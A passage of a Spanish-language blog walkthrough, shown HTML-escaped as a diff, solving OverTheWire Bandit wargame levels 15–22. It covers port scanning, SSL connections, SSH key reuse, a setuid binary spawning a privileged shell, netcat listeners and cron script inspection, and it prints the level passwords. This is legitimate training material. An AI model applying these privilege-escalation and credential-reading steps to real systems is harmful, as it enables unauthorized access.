+  &lt;li&gt;&lt;em&gt;s_cliente&lt;/em&gt; porque hacemos de cliente y no de servidor&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-connect localhost@30001&lt;/em&gt; conectarnos al puerto &lt;em&gt;30001&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit15@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl s_client &lt;span class=&quot;nt&quot;&gt;-connect&lt;/span&gt; localhost:30001 &lt;span class=&quot;nt&quot;&gt;-ign_eof&lt;/span&gt;
+CONNECTED&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;00000003&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;depth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 CN &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; localhost
+verify error:num&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;18:self signed certificate
+verify &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;:1
+&lt;span class=&quot;nv&quot;&gt;depth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 CN &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; loca
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Le enviamos la contraseña del nivel actual y nos regresa la contraseña para el siguiente&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BfMYroe26WYalil77FoDi9qh59eK5xNr
+Correct!
+cluFn7wTiGryunymYOu4RcffSxQluehd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandit-16--17&quot;&gt;bandit 16 –&amp;gt; 17&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Lo primero que hacemos en encontrar los puertos que se nos indican&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit16@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p31000-32000&lt;/span&gt; localhost
+PORT      STATE SERVICE REASON
+31046/tcp open  unknown syn-ack
+31518/tcp open  unknown syn-ack
+31691/tcp open  unknown syn-ack
+31790/tcp open  unknown syn-ack
+31960/tcp open  unknown syn-ack
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Validamos cual permite conexion &lt;em&gt;ssl&lt;/em&gt;, despues de un tanteo, damos con el puerto &lt;em&gt;31790&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit16@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl s_client &lt;span class=&quot;nt&quot;&gt;-connect&lt;/span&gt; localhost:31790
+CONNECTED&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;00000003&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;depth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 CN &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; localhost
+verify error:num&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;18:self signed certificate
+verify &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;:1
+&lt;span class=&quot;nv&quot;&gt;depth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 CN &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; localhost
+verify &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;:1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Enviamos la contraseña actual y obtenemos una &lt;em&gt;id_rsa&lt;/em&gt; que guardamos en un documento, esto lo haremos en un directorio temporal&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit16@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
+bandit16@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/tmp.9jaKsgTmsa
+bandit16@bandit:/tmp/tmp.9jaKsgTmsa&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;id_rsa
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Nos conectamos al usuario &lt;em&gt;bandit17&lt;/em&gt; con la &lt;em&gt;id_rsa&lt;/em&gt; obtenia enteriormente, procedemos a obtener la flag&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit16@bandit:/tmp/tmp.9jaKsgTmsa&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa bandit17@localhost
+bandit17@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/bandit_pass/bandit17
+xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandit-17--18&quot;&gt;bandit 17 –&amp;gt; 18&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Para ver las diferencias en ambos documentos, usamos la herramienta &lt;em&gt;diff&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit17@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;diff passwords.old passwords.new
+42c42
+&amp;lt; w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandit-18--19&quot;&gt;bandit 18 –&amp;gt; 19&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Al intentar inicar sesion mediante &lt;em&gt;SSH&lt;/em&gt;, el servidor nos expulsa&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ssh bandit18@bandit.labs.overthewire.org &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2220     
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit18@bandit.labs.overthewire.org&lt;span class=&quot;s1&quot;&gt;'s password: 
+Linux bandit.otw.local 5.4.8 x86_64 GNU/Linux
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us through IRC on
+  irc.overthewire.org #wargames.
+
+  Enjoy your stay!
+
+Byebye !
+Connection to bandit.labs.overthewire.org closed.
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Cabe resaltar que antes de expulsarnos, existe un minimo de tiempo, aprovechamos eso para intentar crear una bash y leer el &lt;em&gt;readme&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh bandit18@bandit.labs.overthewire.org &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2220 bash
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit18@bandit.labs.overthewire.org&lt;span class=&quot;s1&quot;&gt;'s password: 
+whoami
+bandit18
+ls
+readme
+cat readme
+IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandi-19--20&quot;&gt;bandi 19 –&amp;gt; 20&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Vemos que tenemos un binario con permisos &lt;em&gt;setuid&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit19@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+total 8
+&lt;span class=&quot;nt&quot;&gt;-rwsr-x---&lt;/span&gt; 1 bandit20 bandit19 7296 May  7  2020 bandit20-do
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Ejecutamos &lt;em&gt;./bandit20-do&lt;/em&gt; y vemos que lo hacemos como usuario &lt;em&gt;banditd20&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit19@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./bandit20-do
+Run a &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;as another user.
+  Example: ./bandit20-do &lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;bandit19@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./bandit20-do &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;bandit20
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Intentamos ejecutar una bash, debemos hacer uso del parametro &lt;em&gt;-p&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit19@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./bandit20-do bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
+bash-4.4&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;bandit20
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Perfecto, tenemos una bash como usario bandit20&lt;/li&gt;
+  &lt;li&gt;Obtenemos la flag&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.4&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/bandit_pass/bandit20
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;bandit-20--21&quot;&gt;bandit 20 –&amp;gt; 21&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Vemos que es lo que tenemos en el home&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bas&quot;&gt;bandit20@bandit:~$ ls
+suconnect
+bandit20@bandit:~$ ./suconnect
+Usage: ./suconnect &amp;lt;portnumber&amp;gt;
+This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Debemos ejecutar &lt;em&gt;./suconnect&lt;/em&gt; y decirle por cual puerto nos conectaremos&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit20@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 1234
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Ponemos otra conexion en escucha&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit20@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./suconnect 1234
+Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+Password matches, sending next password
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Nos conectamos y le enviamos la contraseña actual, y nos devuelve la siguiente password&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit20@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 1234
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;127.0.0.1] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;127.0.0.1] 54404
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandit-21--22&quot;&gt;bandit 21 –&amp;gt; 22&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;los-programas-en-cron-son-programas-que-se-ejecutan-cada-cierto-tiempo&quot;&gt;Los programas en &lt;em&gt;cron&lt;/em&gt; son programas que se ejecutan cada cierto tiempo&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Vemos los programas que se ejecuntan en &lt;em&gt;cron&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit21@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /etc/cron.d
+total 24
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root  62 May 14  2020 cronjob_bandit15_root
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root  62 Jul 11  2020 cronjob_bandit17_root
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root 120 May  7  2020 cronjob_bandit22
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root 122 May  7  2020 cronjob_bandit23
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root 120 May 14  2020 cronjob_bandit24
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root  62 May 14  2020 cronjob_bandit25_root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Vemos que ejecuta un script en bash&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit21@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/cron.d/cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;amp;&amp;gt; /dev/null
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; bandit22 /usr/bin/cronjob_bandit22.sh &amp;amp;&amp;gt; /dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Intentamos ver el script&lt;/li&gt;
+  &lt;li&gt;Vemos que tiene permisos 644&lt;/li&gt;
+  &lt;li&gt;Tambien vemos que ejecuta un archivo existente&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit21@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/bin/cronjob_bandit22.sh
+&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/bandit_pass/bandit22 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Vemos el archivo que y, ¡tenemos la flag!&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit21@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="Bash" /><category term="Bandit" /><category term="bash" /><category term="scripting" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry></feed>
